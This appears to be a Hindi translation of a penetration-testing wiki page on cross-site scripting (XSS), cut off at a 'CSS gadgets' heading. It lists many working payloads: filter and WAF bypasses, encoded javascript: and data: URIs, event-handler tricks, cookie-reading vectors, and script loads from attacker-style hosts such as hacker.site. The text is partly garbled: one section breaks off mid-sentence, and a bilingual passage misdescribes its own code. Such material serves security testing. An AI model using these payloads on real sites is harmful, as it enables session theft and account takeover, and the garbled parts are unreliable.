# XSS (क्रॉस साइट स्क्रिप्टिंग)

/<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">

**बग बाउंटी टिप**: **Intigriti** में **साइन अप** करें, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा बनाई गई है**! आज ही हमारे साथ शामिल हों [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), और बाउंटी तक कमाएं **$100,000** तक!

{% embed url="https://go.intigriti.com/hacktricks" %}

## मेथडोलॉजी

1. जांचें कि क्या **आपके द्वारा नियंत्रित कोई मान** (_पैरामीटर_, _पथ_, _हेडर्स_?, _कुकीज़_?) HTML में **प्रतिबिंबित** हो रहा है या **JS** कोड द्वारा **उपयोग** हो रहा है।
2. **प्रतिबिंबित/उपयोग किया जा रहा संदर्भ** ढूंढें।
3. यदि **प्रतिबिंबित हो रहा है**
1. जांचें कि **आप कौन से प्रतीक का उपयोग कर सकते हैं** और इसके आधार पर, पेलोड तैयार करें:
1. **कच्चे HTML** में:
1. क्या आप नए HTML टैग बना सकते हैं?
2. क्या आप `javascript:` प्रोटोकॉल का समर्थन करने वाले इवेंट या एट्रिब्यूट का उपयोग कर सकते हैं?
3. क्या आप सुरक्षा को दौर सकते हैं?
4. क्या HTML सामग्री को कोई क्लाइंट साइड JS इंजन (_AngularJS_, _VueJS_, _Mavo_...) द्वारा अनुप्रयोग किया जा रहा है, तो आप [**क्लाइंट साइड टेम्पलेट इंजेक्शन**](../client-side-template-injection-csti.md) का उपयोग कर सकते हैं।
5. यदि आप HTML टैग नहीं बना सकते जो JS कोड को निष्पादित करते हैं, क्या आप [**डैंगलिंग मार्कअप - HTML स्क्रिप्टलेस इंजेक्शन**](../dangling-markup-html-scriptless-injection/) का उपयोग कर सकते हैं?
2. **HTML टैग** के अंदर:
1. क्या आप कच्चे HTML संदर्भ से बाहर निकल सकते हैं?
2. क्या आप नए इवेंट/एट्रिब्यूट बना सकते हैं जो JS कोड को निष्पादित करते हैं?
3. क्या आप उस एट्रिब्यूट का उपयोग करने वाले जगह में फंसे हुए हैं जो JS कोड को समर्थन करती है?
4. क्या आप सुरक्षा को दौर सकते हैं?
3. **JavaScript कोड** के अंदर:
1. क्या आप `<script>` टैग से बाहर निकल सकते हैं?
2. क्या आप स्ट्रिंग को बाहर निकाल सकते हैं और अलग JS कोड को निष्पादित कर सकते हैं?
3. क्या आपका इनपुट टेम्पलेट लिटरल्स \`\` में है?
4. क्या आप सुरक्षा को दौर सकते हैं?
4. निष्पादित हो रहा है JavaScript **फ़ंक्शन**
1. आप निष्पादित करने के लिए फ़ंक्शन का नाम दे सकते हैं। उदा।: `?callback=alert(1)`
4. यदि **उपयोग हो रहा है**:
1. आप एक **DOM XSS** का उपयोग कर सकते हैं, अपने इनपुट को कैसे नियंत्रित किया जाता है और यदि आपका **नियंत्रित इनपुट किसी सिंक द्वारा उपयोग होता है**, इस पर ध्यान दें।

एक जटिल XSS पर काम करते समय आपको निम्नलिखित के बारे में जानने में रुचि हो सकती है:

{% content-ref url="debugging-client-side-js.md" %}
[debugging-client-side-js.md](debugging-client-side-js.md)
{% endcontent-ref %}

## प्रतिबिंबित मान

XSS को सफलतापूर्वक उपयोग करने के लिए पहली चीज है कि आपको एक **आपके द्वारा नियंत्रित मान ढूंढना होगा जो HTML में प्रतिबिंबित हो रहा है**।

* **बीच में प्रतिबिंबित**: यदि आपको लगता है कि किसी पैरामीटर के मान या यहां तक कि पथ HTML में प्रतिबिंबित हो रहा है, तो आप एक **Reflected XSS** का उपयोग कर सकते हैं।
* **संग्रहीत और प्रतिबिंबित**: यदि आपको लगता है कि आपके द्वारा नियंत्रित किया गया मान सर्वर में सहेजा जाता है और प्रत्येक बार जब आप पृष्ठ तक पहुंचते हैं तो प्रतिबिंबित होता है, तो आप एक **Stored XSS** का उपयोग कर सकते हैं।
* **JS का उपयोग करके एक्सेस**: यदि आपको लगता है कि आपके द्वारा नियंत्रित किया गया मान JS का उपयोग करके एक्सेस किया जा रहा है, तो आप एक **DOM XSS** का उपयोग कर सकते हैं।

## संदर्भ

XSS का उपयो
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
#### जावास्क्रिप्ट होइस्टिंग

जावास्क्रिप्ट होइस्टिंग का उल्लेख करता है कि फ़ंक्शन, वेरिएबल या क्लास को उनके उपयोग के बाद भी घोषित किया जा सकता है।

इसलिए अगर आपके पास ऐसे स्थितियाँ हैं जहां आप **एक घोषित ऑब्जेक्ट के उपयोग के बाद JS कोड इंजेक्ट** कर सकते हैं, तो आप इसे घोषित करके (ताकि आपका कोड त्रुटि नहीं फेंके बल्कि उसे निष्पादित करे) **सिंटैक्स को ठीक कर सकते हैं**:
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
जावास्क्रिप्ट होइस्टिंग के बारे में अधिक जानकारी के लिए देखें: [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)

### जावास्क्रिप्ट फंक्शन

कई वेब पेजों में एंडपॉइंट होते हैं जो **फंक्शन का नाम पैरामीटर के रूप में स्वीकार करते हैं**। जंगल में ऐसा कुछ देखने का एक सामान्य उदाहरण है: `?callback=callbackFunc`।

यदि कुछ सीधे उपयोगकर्ता द्वारा दिया जा रहा है और इसे निष्पादित करने की कोशिश की जा रही है, तो यह जानने का एक अच्छा तरीका है **पैरामीटर मान को संशोधित करना** (उदाहरण के लिए 'Vulnerable' करने के लिए) और कंसोल में त्रुटियों की खोज करना:

![](<../../.gitbook/assets/image (651) (2).png>)

यदि यह संक्रमित होता है, तो आप **एक चेतावनी ट्रिगर** कर सकते हैं, बस इस मान को भेजकर: **`?callback=alert(1)`**। हालांकि, यह आमतौर पर होता है कि इन एंडपॉइंट्स को **सामग्री की प्रमाणित करने** के लिए केवल अक्षर, संख्या, डॉट और अंडरस्कोर (**`[\w\._]`**) की अनुमति दी जाएगी।

हालांकि, इस सीमा के बावजूद अभी भी कुछ कार्रवाई की जा सकती है। इसलिए आप उस मान्य वर्णों का उपयोग करके **डॉम में किसी भी तत्व तक पहुंच सकते हैं**:

![](<../../.gitbook/assets/image (662).png>)

इसके लिए कुछ उपयोगी फंक्शन:
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
आप सीधे **जावास्क्रिप्ट फंक्शन्स को ट्रिगर करने** की कोशिश भी कर सकते हैं: `obj.sales.delOrders`.

हालांकि, आमतौर पर इस तरह की फंक्शन को निष्पादित करने वाले एंडपॉइंट्स में कोई रोचक DOM नहीं होता है, **एक ही मूल स्रोत में अन्य पृष्ठ** के पास एक **अधिक रोचक DOM** होता है जिसके माध्यम से अधिक क्रियाएँ की जा सकती हैं।

इसलिए, इस दुर्भाग्यपूर्णता का उपयोग करने के लिए **एक अलग DOM में दुर्भाग्यपूर्णता का उपयोग** करने के लिए **समान मूल विधि निष्पादन (SOME)** अपशिष्ट विकसित किया गया था:

{% content-ref url="some-same-origin-method-execution.md" %}
[some-same-origin-method-execution.md](some-same-origin-method-execution.md)
{% endcontent-ref %}

### DOM

यहां **JS कोड** है जो **हमेशा** कुछ **हमलवार डेटा** का **असुरक्षित रूप से** उपयोग कर रहा है जैसे `location.href`। एक हमलावर, इसे दुर्भाग्यपूर्ण JS कोड को निष्पादित करने के लिए इस्तेमाल कर सकता है।

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

### **सार्वभौमिक XSS**

इस तरह के XSS को **कहीं भी** पाया जा सकता है। इन्हें केवल वेब एप्लिकेशन के ग्राहक द्वारा शोषण पर ही नहीं बल्कि **किसी भी** **संदर्भ** पर निर्भरता होती है। इस तरह के **अनियमित जावास्क्रिप्ट निष्पादन** का उपयोग तकनीकी रूप से **RCE** प्राप्त करने, ग्राहकों और सर्वरों में **किसी भी** **फ़ाइल** को **पढ़ने** और अधिक करने के लिए इस्तेमाल किया जा सकता है।\
कुछ **उदाहरण**:

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

{% content-ref url="../../network-services-pentesting/pentesting-web/electron-desktop-apps/" %}
[electron-desktop-apps](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endcontent-ref %}

## WAF बाईपास एनकोडिंग इमेज

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](../../.gitbook/assets/eaubb2ex0aerank.jpg)

## रॉ एचटीएमएल में इंजेक्शन

जब आपका इनपुट **HTML पेज के अंदर प्रतिबिंबित** होता है या आप इस संदर्भ में HTML कोड को छोड़ सकते हैं और इसमें इंजेक्शन कर सकते हैं, तो **पहली** चीज जो आपको करनी होगी वह यह है कि आप नए टैग बनाने के लिए `<` का उपयोग कर सकते हैं: बस इस **वर्ण** को **प्रतिबिंबित** करने का प्रयास करें और देखें कि क्या यह **HTML एनकोड** हो रहा है या **हटा दिया जाता है** या यह **परिवर्तन के बिना प्रतिबिंबित** हो रहा है। **केवल अंतिम मामले में आप इस मामले का दुरुपयोग कर सकेंगे**।\
इस तरह के मामलों के लिए भी [**क्लाइंट साइड टेम्पलेट इंजेक्शन**](../client-side-template-injection-csti.md)** को ध्यान में रखें**।\
_**नोट: एक HTML टिप्पणी को `-->` या `--!>` का उपयोग करके बंद किया जा सकता है**_

इस मामले में और यदि कोई काले / सफेद सूची नहीं उपयोग की जाती है, तो आप इस तरह के payloads का उपयोग कर सकते हैं:
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
लेकिन, यदि टैग/एट्रिब्यूट की काली/सफेद सूची का उपयोग किया जा रहा है, तो आपको जांचने की आवश्यकता होगी कि आप कौन से टैग बना सकते हैं।\
एक बार जब आपने पता लगा लिया है कि कौन से टैग अनुमत हैं, तो आपको पाये गए मान्य टैग्स के भीतर एट्रिब्यूट/इवेंट्स की ब्रूट-फोर्स करनी होगी ताकि आप देख सकें कि आप कैसे संदर्भ पर हमला कर सकते हैं।

### टैग/इवेंट्स ब्रूट-फोर्स

[**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) पर जाएं और _**Copy tags to clipboard**_ पर क्लिक करें। फिर, बर्प इंट्रूडर का उपयोग करके सभी टैग्स को भेजें और देखें कि क्या कोई टैग WAF द्वारा खोजा नहीं गया है। एक बार जब आपने पता लगा लिया है कि आप कौन से टैग का उपयोग कर सकते हैं, तो आप मान्य टैग्स का उपयोग करके सभी इवेंट्स की ब्रूट-फोर्स कर सकते हैं (वेब पेज पर _**Copy events to clipboard**_ पर क्लिक करें और पहले जैसी प्रक्रिया का पालन करें)।

### कस्टम टैग

यदि आपने कोई मान्य HTML टैग नहीं पाया है, तो आप एक कस्टम टैग बनाने का प्रयास कर सकते हैं और `onfocus` एट्रिब्यूट के साथ JS कोड को निष्पादित कर सकते हैं। XSS अनुरोध में, आपको पृष्ठ को उस वस्तु पर **ध्यान केंद्रित करने** और कोड **निष्पादित** करने के लिए URL को `#` से समाप्त करना होगा:
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### ब्लैकलिस्ट बाईपास

यदि किसी प्रकार की ब्लैकलिस्ट का उपयोग किया जा रहा है, तो आप कुछ मूर्खतापूर्ण तरीकों के साथ इसे बाईपास करने का प्रयास कर सकते हैं:
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### लंबाई बाईपास (छोटे XSS)

{% hint style="info" %}
**विभिन्न वातावरणों के लिए और छोटे XSS के लिए** पेलोड [**यहां**](https://github.com/terjanq/Tiny-XSS-Payloads) और [**यहां**](https://tinyxss.terjanq.me) मिल सकता है।
{% endhint %}
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>
```
अंतिम तकनीक में 2 यूनिकोड वर्णों का उपयोग किया जाता है जो 5 में विस्तारित होते हैं: telsr\
इन वर्णों के अधिक विस्तार को [यहां](https://www.unicode.org/charts/normalization/) देखा जा सकता है।\
यह जांचने के लिए कि कौन से वर्ण विभाजित होते हैं, [यहां](https://www.compart.com/en/unicode/U+2121) देखें।

### XSS क्लिक - क्लिकजैकिंग

यदि आप संक्रमण की कमजोरी का उपयोग करने के लिए **उपयोगकर्ता को एक लिंक या एक फॉर्म पर क्लिक** करने की आवश्यकता होती है, तो आप [**क्लिकजैकिंग**](../clickjacking.md#xss-clickjacking) का दुरुपयोग करने का प्रयास कर सकते हैं (यदि पेज संक्रमित होता है)।

### असंभव - डैंगलिंग मार्कअप

यदि आप सिर्फ यह सोचते हैं कि **HTML टैग बनाना एक ऐसा काम है जिसमें एक विशेषता होती है जो JS कोड को निष्पादित करती है**, तो आपको [**डैंगलिंग मार्कअप**](../dangling-markup-html-scriptless-injection/) की जांच करनी चाहिए क्योंकि आप संक्रमितता का उपयोग कर सकते हैं **बिना** JS कोड को निष्पादित किए।

## HTML टैग के भीतर इंजेक्शन

### टैग के भीतर/विशेषता मान से बाहर निकलना

यदि आप **HTML टैग के भीतर** हैं, तो पहली चीज जो आप कर सकते हैं वह है टैग से **बाहर निकलना** और [पिछले खंड](./#injecting-inside-raw-html) में उल्लिखित कुछ तकनीकों का उपयोग करके JS कोड को निष्पादित करने का प्रयास करना।\
यदि आप **टैग से बाहर नहीं निकल सकते हैं**, तो आप टैग के भीतर नए विशेषताओं को बना सकते हैं ताकि JS कोड को निष्पादित करने का प्रयास कर सकें, उदाहरण के लिए कुछ पेलोड का उपयोग करके (_ध्यान दें कि इस उदाहरण में डबल कोटेशन विशेषता से बाहर निकलने के लिए उपयोग किए जाते हैं, यदि आपका इनपुट सीधे रूप से टैग के भीतर प्रतिबिंबित होता है तो आपको उनकी आवश्यकता नहीं होगी_):
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**शैली घटनाएं**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### एट्रिब्यूट के भीतर

यदि आप **एट्रिब्यूट से बाहर निकल नहीं सकते** हैं (`"` को एनकोड या हटा दिया जाता है), तो आपके मालिकाना वैल्यू को किस एट्रिब्यूट में प्रतिबिंबित किया जा रहा है, इस पर निर्भर करके, आप इसका दुरुपयोग कर सकेंगे। **उदाहरण के लिए**, यदि आप `onclick=` जैसी घटना को नियंत्रित करते हैं, तो आप इसे क्लिक करने पर विचित्र कोड को निष्पादित करने के लिए सक्षम होंगे।\
एक और दिलचस्प **उदाहरण** है `href` एट्रिब्यूट, जहां आप `javascript:` प्रोटोकॉल का उपयोग करके विचित्र कोड को निष्पादित कर सकते हैं: **`href="javascript:alert(1)"`**

**HTML एनकोडिंग/URL एनकोड का उपयोग करके इवेंट के भीतर बाईपास**

HTML टैग एट्रिब्यूट के मान में **HTML एनकोडिंग वाले वर्ण** रनटाइम पर **डिकोड होते हैं**। इसलिए निम्नलिखित कुछ वैध होगा (पेलोड बोल्ड में है): `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

ध्यान दें कि **किसी भी प्रकार का HTML एनकोड वैध है**:
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**ध्यान दें कि URL कोडिंग भी काम करेगी:**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**यूनिकोड एन्कोड का उपयोग करके इनसाइड इवेंट को बाइपास करें**

Sometimes, web applications implement filters to prevent the execution of certain events, such as the `onclick` event. However, these filters can be bypassed using Unicode encoding.

कभी-कभी, वेब एप्लिकेशन में निश्चित इवेंट्स, जैसे `onclick` इवेंट, के निष्पादन को रोकने के लिए फ़िल्टर लागू किए जाते हैं। हालांकि, यूनिकोड एन्कोडिंग का उपयोग करके इन फ़िल्टर को बाइपास किया जा सकता है।

```html
<input type="text" value="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

In the above example, the `onclick` event is bypassed by encoding the JavaScript code using Unicode. The encoded JavaScript code is then rendered as HTML, resulting in the execution of the desired event.

उपरोक्त उदाहरण में, `onclick` इवेंट को यूनिकोड का उपयोग करके बाइपास किया जाता है। यूनिकोड का उपयोग करके जावास्क्रिप्ट कोड को एन्कोड किया जाता है और फिर इस एन्कोडेड जावास्क्रिप्ट कोड को HTML के रूप में प्रदर्शित किया जाता है, जिससे वांछित इवेंट का निष्पादन होता है।
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### विशेष प्रोटोकॉल आवंटन

यहां आप कुछ स्थानों में **`javascript:`** या **`data:`** प्रोटोकॉल का उपयोग करके **कोई भी JS कोड चला सकते हैं**। कुछ मामलों में उपयोगकर्ता संवाद की आवश्यकता होगी और कुछ मामलों में नहीं।
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**जहां आप इन प्रोटोकॉल को इंजेक्ट कर सकते हैं**

**सामान्य रूप से** `javascript:` प्रोटोकॉल को **`href` एट्रिब्यूट को स्वीकार करने वाले किसी भी टैग में उपयोग किया जा सकता है** और **अधिकांश** टैग में उपयोग किया जा सकता है जो **`src` एट्रिब्यूट को स्वीकार करते हैं** (लेकिन `<img` नहीं)
```markup
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**अन्य अविलक्षण चालें**

_**इस मामले में, पिछले खंड से HTML कोडिंग और यूनिकोड कोडिंग ट्रिक भी मान्य हैं क्योंकि आप एक गुण में हैं।**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
इसके अलावा, इन मामलों के लिए एक और **अच्छा ट्रिक** है: **यदि आपका `javascript:...` के अंदर इनपुट URL कोड किया जा रहा है, तो इसे एक्सीक्यूट होने से पहले URL डीकोड हो जाएगा।** तो, यदि आपको एक **सिंगल कोट** के द्वारा **स्ट्रिंग** से **बाहर निकलना** है और आप देखते हैं कि यह **URL कोड किया जा रहा है**, तो ध्यान दें कि **यह मायने नहीं रखता है,** इसे **एक्सीक्यूशन** के समय एक **सिंगल कोट** के रूप में **इंटरप्रिट** किया जाएगा।
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
नोट करें कि यदि आप कोशिश करते हैं कि **दोनों का उपयोग करें** `URLencode + HTMLencode` किसी भी क्रम में **पेलोड** को एनकोड करने के लिए, तो यह **काम नहीं करेगा**, लेकिन आप **पेलोड के अंदर उन्हें मिश्रित कर सकते हैं**।

**`javascript:` के साथ हेक्स और ऑक्टल एनकोड का उपयोग करें**

आप `iframe` के `src` एट्रिब्यूट के अंदर **हेक्स** और **ऑक्टल एनकोड** का उपयोग कर सकते हैं (कम से कम) **जेएस को निष्पादित करने के लिए HTML टैग्स घोषित करने के लिए**।
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### रिवर्स टैब नैबिंग

Reverse tab nabbing एक एक्सएसएस (XSS) हमला है जो वेब अनुप्रयोगों को प्रभावित करता है। इस हमले में, हमलावर एक वेब पृष्ठ को तैयार करता है जो उपयोगकर्ता के ब्राउज़र में खुलता है और उपयोगकर्ता के ब्राउज़र टैब को बदलता है। जब उपयोगकर्ता वापस आता है, तो वेब पृष्ठ उपयोगकर्ता को अपनी पहले खोली गई वेबसाइट की तरह दिखाता है, लेकिन वास्तविकता में उपयोगकर्ता का खाता और पासवर्ड हमलावर के पास भेज देता है।

यह हमला उपयोगकर्ता के ब्राउज़र में खुले वेबसाइटों के लिंकों का उपयोग करके किया जा सकता है, जिन्हें उपयोगकर्ता विश्वसनीय मानता है। इसलिए, उपयोगकर्ता को सतर्क रहना चाहिए और अज्ञात लिंकों को खोलने से पहले सत्यापित करना चाहिए।
```javascript
<a target="_blank" rel="opener"
```
यदि आप किसी भी विषयास्थ **`<a href=`** टैग में किसी भी URL को इंजेक्ट कर सकते हैं जो **`target="_blank"`** और **`rel="opener"`** गुणधर्मों को सम्मिलित करता है, तो इस व्यवहार का शोध लेने के लिए **निम्नलिखित पृष्ठ की जांच करें**:

{% content-ref url="../reverse-tab-nabbing.md" %}
[reverse-tab-nabbing.md](../reverse-tab-nabbing.md)
{% endcontent-ref %}

### on ईवेंट हैंडलर्स बाईपास

सबसे पहले, उपयोगी **"on" ईवेंट हैंडलर्स** के लिए इस पृष्ठ ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) की जांच करें।\
यदि कोई ब्लैकलिस्ट है जो इस ईवेंट हैंडलर्स को बनाने से रोकती है, तो आप निम्नलिखित बाईपास का प्रयास कर सकते हैं:
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### "अविश्वसनीय टैग" में XSS (छिपे हुए इनपुट, लिंक, कैननिकल, मेटा)

[**यहां से**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **अब छिपे हुए इनपुट का दुरुपयोग करना संभव है:**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>
```
और **मेटा टैग्स** में:
```html
<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
[**यहाँ से**](https://portswigger.net/research/xss-in-hidden-input-fields): आप एक **छिपे हुए एट्रिब्यूट के अंदर XSS पेलोड** को निष्पादित कर सकते हैं, यदि आप **पीड़ित** को **मनाने** में सक्षम हों। Firefox Windows/Linux पर की कुंजी संयोजन **ALT+SHIFT+X** है और OS X पर यह **CTRL+ALT+X** है। आप एक्सेस की एट्रिब्यूट में एक अलग कुंजी संयोजन निर्दिष्ट कर सकते हैं। यहाँ वेक्टर है:
```markup
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**एक्सएसएस पेलोड कुछ इस तरह होगा: `" accesskey="x" onclick="alert(1)" x="`**

### ब्लैकलिस्ट बाईपास

इस सेक्शन में पहले से ही विभिन्न इंकोडिंग का उपयोग करके कई ट्रिक्स उजागर की गई हैं। जानने के लिए **वापस जाएं कि आप कहां उपयोग कर सकते हैं:**

* **एचटीएमएल इंकोडिंग (एचटीएमएल टैग)**
* **यूनिकोड इंकोडिंग (मान्य जेएस कोड हो सकता है):** `\u0061lert(1)`
* **यूआरएल इंकोडिंग**
* **हेक्स और ऑक्टल इंकोडिंग**
* **डेटा इंकोडिंग**

**एचटीएमएल टैग और एट्रिब्यूट्स के लिए बाईपास**

पिछले सेक्शन के [ब्लैकलिस्ट बाईपास](./#blacklist-bypasses) को पढ़ें।

**जावास्क्रिप्ट कोड के लिए बाईपास**

आगे के सेक्शन के [जावास्क्रिप्ट बाईपास ब्लैकलिस्ट तकनीकों](./#javascript-bypass-blacklists-techniques) को पढ़ें।

### सीएसएस-गैजेट्स

